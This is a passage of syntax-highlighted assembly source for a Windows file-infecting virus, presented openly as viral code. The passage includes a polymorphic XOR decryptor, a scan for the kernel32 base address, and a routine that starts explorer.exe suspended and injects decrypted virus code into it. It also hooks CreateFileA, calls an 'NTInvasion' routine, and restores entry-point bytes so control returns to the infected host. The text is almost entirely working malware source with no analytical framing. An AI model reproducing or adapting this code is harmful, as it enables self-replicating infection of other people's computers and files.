</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">retNoInfect</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">retPerProcess</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">retNoInfect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Pad</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">PADDING</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-(((</span><span class="sc5">Pad</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*((</span><span class="sc5">Pad</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">))))</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">PADDING</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;code size its a multiple of 4 becoz encryption reasons.</span><span class="sc0">


</span><span class="sc5">ECode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">



</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">MyEntryPoint</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;HERE EXECUTION BEGINS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><span class="sc0">

</span><span class="sc1">;vvvvvvvvvvvvvvvvvvpolymorphed</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">DkRyPtIt</span><span class="sc0">
</span><span class="sc5">DkRyPtIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">DkRyPtIt</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,((</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Encrypted</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">GoGoGo</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GoGoGo</span><span class="sc0">
</span><span class="sc5">endDKR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">PADDKR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">endDKR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MyEntryPoint</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">PADDKR</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;dekryptor has always 200 bytes :'(</span><span class="sc0">
</span><span class="sc1">;^^^^^^^^^^^^^^^^^^polymorphed</span><span class="sc0">

</span><span class="sc5">Encrypted</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">d_offset</span><span class="sc0">
</span><span class="sc5">d_offset</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">d_offset</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">  
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc1">;eax -&gt; a part of kernel32</span><span class="sc0">
</span><span class="sc5">SearchKernel</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchKernel</span><span class="sc0">


</span><span class="sc1">;callz DetectSICE</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">InjectToExplorer</span><span class="sc0"> </span><span class="sc1">;ill run other part of code in explorer.exe</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">000000E8h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoHook</span><span class="sc0">
</span><span class="sc1">;if part of explorer injected code its uncrypted before copying it to explorer then </span><span class="sc0">
</span><span class="sc1">;we can hook CreateFileA api ;)</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">HookCreateFileA</span><span class="sc0">
</span><span class="sc5">NoHook</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">NTInvasion</span><span class="sc0"> </span><span class="sc1">;/</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">EndFirstPart</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OldEntryPoint</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">endit</span><span class="sc0">

</span><span class="sc1">;here we restore EPO bytes and jmp there</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetModuleHandleACRC</span><span class="sc4">,</span><span class="sc5">GMHNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OldEntryPoint</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EPOCodeSize</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">UnprotectMem</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EPORestoreBytes</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EPOCodeSize</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">endit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;only first gen...in second we return to host</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">OldEntryPoint</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EPORestoreBytes</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">EPOCodeSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Loads and injects to explorer the viral code and execute it.</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;   eax = Base Kernel</span><span class="sc0">
</span><span class="sc1">;out: </span><span class="sc0">
</span><span class="sc1">;   none</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">InjectToExplorer</span><span class="sc4">:</span><span class="sc1">;only in 9x</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ContinueInjecting</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ContinueInjecting</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc1">;we save kernel base</span><span class="sc0">
</span><span class="sc1">;now ill create a new process but stopped...createprocess has a option</span><span class="sc0">
</span><span class="sc1">;to create the process stopped and you can to force it to continue later.So ill </span><span class="sc0">
</span><span class="sc1">;create this new process and after ill infect in memory it with this code but </span><span class="sc0">
</span><span class="sc1">;uncryting encrypted parts. </span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">LoadExplorer9x</span><span class="sc0">
</span><span class="sc1">;   eax = handle to process</span><span class="sc0">
</span><span class="sc1">;   ebx = process ID</span><span class="sc0">
</span><span class="sc1">;   ecx = offset of primary module(.exe module)</span><span class="sc0">
</span><span class="sc1">;   edx = size of module in bytes</span><span class="sc0">
</span><span class="sc1">;   esi = primary thread handle</span><span class="sc0">
</span><span class="sc1">;   edi = primary thread ID</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;handle of process</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;base of kernel</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">;offset of module</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;size of module</span><span class="sc0">
</span><span class="sc1">;now we unprotect new process mem</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">UnprotectMem</span><span class="sc0">
</span><span class="sc1">;esp -&gt; threadID/+4 hThread/+16 processID/+20 sizeMod/+24 offMod/+28 hProcess/+32 KernelBase</span><span class="sc0">
</span><span class="sc1">;now i must search entry point of new process</span><span class="sc0">
</span><span class="sc1">;Readz macro BaseKernel,hProcess,OffsetInProc,Buffer,Size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc1">;BaseKernel</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc1">;hProcess</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">]</span><span class="sc1">;OffsetInProc</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">       </span><span class="sc1">;for reading lfanew</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;space for reading lfanew value</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">       </span><span class="sc1">;Buffer</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">Readz</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">;lfanew</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">       </span><span class="sc1">;lfanew + module</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">       </span><span class="sc1">;lfanew + module + 28h for reading entryPoint</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;space for reading lfanew value</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">       </span><span class="sc1">;Buffer</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">Readz</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">]</span><span class="sc1">;OffsetInProc</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;edi = entryPoint in module in new process</span><span class="sc0">

</span><span class="sc1">;we encrypted Code with random key since FFFF0000h to FFFFFFFFh so </span><span class="sc0">
</span><span class="sc1">;now we must search the key using brute force</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">WhatKey</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">000000E8h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">KeyFound</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">WhatKey</span><span class="sc0">
</span><span class="sc5">KeyFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;edx = key</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,((</span><span class="sc5">ECode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;and now we will write the code to new process uncrypting it while</span><span class="sc0">

</span><span class="sc5">WriteCode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc5">Writez</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">WriteCode</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EVirus</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CodeCopied</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,((</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ECode</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">WriteCode</span><span class="sc0">

</span><span class="sc5">CodeCopied</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;here we must have copied all code and now we must start execution of thread</span><span class="sc0">
</span><span class="sc1">;esp -&gt; threadID/+4 hThread/+16 processID/+20 sizeMod/+24 offMod/+28 hProcess/+32 KernelBase</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ResumeThreadCRC</span><span class="sc4">,</span><span class="sc5">RTNameLen</span><span class="sc0">
</span><span class="sc1">;eax -&gt; ResumeThread</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc1">;Thread Handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;UnprotectMem sets as writable zone since esi to esi + ecx in ebx process.</span><span class="sc0">
</span><span class="sc1">;in: </span><span class="sc0">
</span><span class="sc1">;   eax -&gt; base of kernel</span><span class="sc0">
</span><span class="sc1">;   esi -&gt; dir of memory that will be writable.</span><span class="sc0">
</span><span class="sc1">;   ecx -&gt; bytes of that memory.  </span><span class="sc0">
</span><span class="sc1">;   ebx -&gt; handle of the process where is the memory.If 0 this process</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">UnprotectMem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoThisProcess</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetCurrentProcessCRC</span><span class="sc4">,</span><span class="sc5">GCPNameLen</span><span class="sc0">
</span><span class="sc1">;eax -&gt; GetCurrentProcess</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;eax = hand of this process</span><span class="sc0">
